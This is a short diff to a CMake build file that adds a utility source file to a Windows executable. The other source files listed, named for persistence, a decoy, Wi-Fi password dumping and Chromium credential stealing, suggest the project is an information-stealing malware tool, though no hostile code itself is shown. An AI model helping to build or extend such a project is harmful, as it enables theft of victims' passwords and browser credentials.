@@ -48,6 +48,7 @@ add_executable(main WIN32
     src/persistence/Persistence.cpp
     src/decoy/Decoy.cpp
     src/utils/Cleanup.cpp
+    src/utils/Shared.cpp
     src/wifi/WifiDumper.cpp
     src/utils/Exec.cpp
     src/credential/ChromiumStealer.cpp
